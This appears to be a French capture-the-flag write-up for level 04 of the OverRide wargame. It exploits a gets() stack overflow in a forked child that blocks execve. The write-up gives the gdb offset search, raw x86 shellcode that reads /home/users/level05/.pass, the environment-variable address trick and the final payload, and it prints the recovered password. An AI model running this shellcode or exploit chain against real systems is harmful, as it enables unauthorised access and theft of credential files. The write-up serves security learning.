# Level 04

Voici le code source de ce niveau:

```C
#include <stdio.h>
#include <signal.h>
#include <unistd.h>
#include <strings.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <linux/prctl.h>

int main(void)
{
    int pid;
    char buff[128];
    long syscall_num;

    pid = fork();
    bzero(buff, 128);
    if (pid == 0)
    {
        prctl(PR_SET_PDEATHSIG, SIGHUP);
        ptrace(PTRACE_TRACEME, 0, 0, 0);
        puts("Give me some shellcode, k");
        gets(buff);
    }
    else
    {
        do
        {
            wait(&pid);
            if (WIFEXITED(pid) || WIFSIGNALED(pid))
            {
                puts("child is exiting...");
                return 0;
            }
            syscall_num = ptrace(PTRACE_PEEKUSER, pid, 0x2c, 0);
        } while (syscall_num != 11); // execve
        puts("no exec() for you");
        kill(pid, 9);
    }
    return 0;
}
```

Ici nous allons devoir executer une attaque par shellcode pour, non pas executer `/bin/sh` comme nous le faisions jusqu'ici mais ecrire le contenu de `/home/users/level05/.pass` dans la stdout. L'idee est donc de reecrire l'adresse de retour de l'enfant pour executer notre nouveau shellcode. Il nous faut donc l'offset auquel ecrire l'adresse dans le buffer:

```bash
level04@OverRide:~$ gdb ./level04
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/users/level04/level04...(no debugging symbols found)...done.
(gdb) set follow-fork-mode child
(gdb) set detach-on-fork off
(gdb) run
Starting program: /home/users/level04/level04
[New process 1966]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1966]
0x41326641 in ?? () # Offset = 156
```

A cause du fait que le programme `fork()` il nous est tres difficile de trouver ne serait-ce qu'une approximation de l'adresse de `buff`. Donc nous allons stocker notre shellcode dans une variable d'environement:

```bash
export SHELLCODE=$(python -c 'print "\x90" * 100 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass"')
```

Ensuite il nous faut juste recuperer l'adresse de notre variable d'environement comme ceci:

```bash
level04@OverRide:~$ gdb ./level04
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/users/level04/level04...(no debugging symbols found)...done.
(gdb) break main
Breakpoint 1 at 0x80486cd
(gdb) run
Starting program: /home/users/level04/level04

Breakpoint 1, 0x080486cd in main ()
(gdb) x/20s *((char**)environ)
0xffffd871:      "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\061\333\061\311\061\322\353\062[\260\005\061\311̀\211\306\353\006\260\001\061\333̀\211\363\260\003\203\354\001\215\f$\262\001̀1\333\071\303t\346\260\004\263\001\262\001̀\203\304\001\353\337\350\311\377\377\377/home/users/level05/.pass"
```

Nous pouvons ensuite construire notre payload et executer le programme en ajoutant un padding a l'adresse de notre shellcode:

```bash
level04@OverRide:~$ python -c 'print "A" * 156 + "\x51\xd8\xff\xff"' | ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
child is exiting...
```
